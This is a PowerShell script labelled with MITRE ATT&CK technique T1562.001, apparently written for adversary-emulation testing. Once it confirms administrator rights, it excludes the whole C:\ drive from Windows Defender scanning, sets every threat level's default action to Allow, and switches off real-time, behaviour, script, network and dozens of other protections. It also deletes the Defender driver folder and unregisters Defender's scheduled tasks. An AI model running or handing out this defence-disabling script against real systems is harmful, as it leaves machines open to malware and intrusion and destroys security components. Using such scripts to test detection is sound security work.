<#
    T1562.001 - Impair Defenses: Disable or Modify Tools
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append

if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) 
{ 
    Write-Warning "You do not have Administrator rights to run this script!`nPlease re-run this script as an Administrator!"
    Break 
}

# Add C:\ exclusions for malware detection
Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue

# Allow actions on detections
Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue

# Completely disable Windows Defender on a computer
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Disable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true
# Disable cloud protection
Set-MpPreference -MAPSReporting Disabled
# Disable threat behavior
Set-MpPreference -EnableBehaviorMonitoring Disabled
# Disable threat detection
Set-MpPreference -EnableNetworkProtection Disabled
# Disable threat scan
Set-MpPreference -DisableArchiveScanning Disabled
# Disable tamper protection
Set-MpPreference -EnableControlledFolderAccess Disabled
# Remove excluded file types
Set-MpPreference -ExclusionExtension ""
# Remove excluded processes
Set-MpPreference -ExclusionProcess ""
# Remove excluded paths
Set-MpPreference -ExclusionPath ""
# Remove excluded network paths
Set-MpPreference -ExclusionPathOnNetwork ""
# Disable scan schedule
Set-MpPreference -ScheduleScanType 0
# Disable scan time
Set-MpPreference -ScheduleScanTime ""
# Disable scan day
Set-MpPreference -ScheduleScanDay ""
# Disable action on detected threats
Set-MpPreference -DisableRemediation $true
# disable blocking at first seen
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
# disable catchup full scan
Set-MpPreference -DisableCatchupFullScan $true -ErrorAction SilentlyContinue
# disable catchup quick scan
Set-MpPreference -DisableCatchupQuickScan $true -ErrorAction SilentlyContinue
# disable CPU Throttle on idle scans
Set-MpPreference -DisableCpuThrottleOnIdleScans $true -ErrorAction SilentlyContinue
# disable datagram processing
Set-MpPreference -DisableDatagramProcessing $true -ErrorAction SilentlyContinue
# disable DNS over TCP parsing
Set-MpPreference -DisableDnsOverTcpParsing $true -ErrorAction SilentlyContinue
# disable DNS parsing
Set-MpPreference -DisableDnsParsing $true -ErrorAction SilentlyContinue
# disable email scanning
Set-MpPreference -DisableEmailScanning $true -ErrorAction SilentlyContinue
# disable, gradual release
Set-MpPreference -DisableGradualRelease $true -ErrorAction SilentlyContinue
# disable HTTP parsing
Set-MpPreference -DisableHttpParsing $true -ErrorAction SilentlyContinue
# disable inbound connection filtering
Set-MpPreference -DisableInboundConnectionFiltering $true -ErrorAction SilentlyContinue
# disable privacy mode
Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
# disable RDP parsing
Set-MpPreference -DisableRdpParsing $true -ErrorAction SilentlyContinue
# disable removable drive scanning
Set-MpPreference -DisableRemovableDriveScanning $true -ErrorAction SilentlyContinue
# disable restore point
Set-MpPreference -DisableRestorePoint $true -ErrorAction SilentlyContinue
# disable scanning mapped network drives for full scan
Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true -ErrorAction SilentlyContinue
# disable scanning network files
Set-MpPreference -DisableScanningNetworkFiles $true -ErrorAction SilentlyContinue
# disable SSH parsing
Set-MpPreference -DisableSshParsing $true -ErrorAction SilentlyContinue
# disable TLS parsing
Set-MpPreference -DisableTlsParsing $true -ErrorAction SilentlyContinue
# disable archive scanning
Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
# disable auto exclusions
Set-MpPreference -DisableAutoExclusions $true -ErrorAction SilentlyContinue
# disable realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
# disable behavior monitoring
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
# disable IOA V protection
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
# disable intrusion prevention system
Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
# disable script scanning
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue

# delete Defender driver
Remove-Item "C:\Windows\System32\drivers\wd\" -Recurse -Force


# Get the scheduled tasks
$tasks = Get-ScheduledTask | Where-Object {$_.TaskName -like "*Windows Defender*"}
# Loop through each task and delete it
foreach ($task in $tasks)
{
    Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false
}

Stop-Transcript
